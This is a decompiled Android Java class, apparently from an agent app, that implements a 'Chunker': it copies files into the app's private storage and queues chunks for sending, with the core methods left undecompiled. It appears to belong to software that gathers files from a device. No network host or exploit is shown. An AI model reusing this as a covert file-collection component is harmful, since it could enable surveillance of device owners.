package com.network.i;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;
import com.network.media.q;
import java.io.File;

public final class b {

    /* renamed from: a  reason: collision with root package name */
    private static final Object f153a = new Object();
    private static b b = null;
    private BroadcastReceiver c = new c(this);

    private b() {
        a.a("Chunker -  started");
        NetworkApp.a().registerReceiver(this.c, new IntentFilter("new_chunker_file_event"));
        a.a("Chunker -  after registering the reciever");
    }

    /* JADX WARNING: Code restructure failed: missing block: B:46:0x01bd, code lost:
        r1 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:47:0x01be, code lost:
        com.network.android.c.a.a.a("chunkData sending chunk" + r1.getMessage(), r1);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:48:0x01d4, code lost:
        if (r8 != null) goto L_0x01d6;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:49:0x01d6, code lost:
        r8.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:50:0x01d9, code lost:
        return -1;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:0x026e, code lost:
        r2.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:80:0x02d5, code lost:
        r1 = e;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:81:0x02d6, code lost:
        r2 = r8;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:57:0x026e  */
    /* JADX WARNING: Removed duplicated region for block: B:64:0x0296  */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x02a0  */
    /* JADX WARNING: Removed duplicated region for block: B:80:0x02d5 A[ExcHandler: IOException (e java.io.IOException), Splitter:B:9:0x003f] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static int a(int r13, java.lang.String r14, java.lang.String r15, java.lang.String r16, int r17, java.lang.String r18, int r19, android.content.Context r20) {
        /*
        // Method dump skipped, instructions count: 750
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.i.b.a(int, java.lang.String, java.lang.String, java.lang.String, int, java.lang.String, int, android.content.Context):int");
    }

    /* JADX WARNING: Removed duplicated region for block: B:12:0x00ae A[SYNTHETIC, Splitter:B:12:0x00ae] */
    /* JADX WARNING: Removed duplicated region for block: B:15:0x00b3  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static int a(java.lang.String r5, java.lang.String r6, int r7, int r8, int r9, java.lang.String r10) {
        /*
        // Method dump skipped, instructions count: 213
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.i.b.a(java.lang.String, java.lang.String, int, int, int, java.lang.String):int");
    }

    public static b a() {
        if (b == null) {
            b = new b();
        }
        return b;
    }

    public static void a(String str, String str2, int i, int i2, String str3) {
        a.a("Chunker -  chank start. filePath: " + str + " timeStamp: " + str2 + " callerId: " + i + " isCompressed: " + i2);
        try {
            File file = new File(str);
            if (!file.exists()) {
                a.a("Chunker -  file does not exists. returning:" + str);
                return;
            }
            new File("/data/data/com.network.android/chnkr/").mkdirs();
            String str4 = "/data/data/com.network.android/chnkr/" + file.getName() + "_" + str2;
            File file2 = new File(str4);
            if (-1 == q.a(str, str4)) {
                a.a("Chunker  -  copy file failed. returning");
                if (file2.exists()) {
                    file2.delete();
                }
            } else if (-1 == a(str2, str, i, (int) file2.length(), i2, str3)) {
                file2.delete();
            } else {
                NetworkApp.a().sendBroadcast(new Intent("new_chunker_file_event"));
            }
        } catch (Throwable th) {
            a.a("Chunker - chank exception: " + th.getMessage(), th);
        }
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0071  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public synchronized void b() {
        /*
        // Method dump skipped, instructions count: 611
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.i.b.b():void");
    }

    public final void a(Context context) {
        try {
            context.unregisterReceiver(this.c);
        } catch (Throwable th) {
        }
    }
}
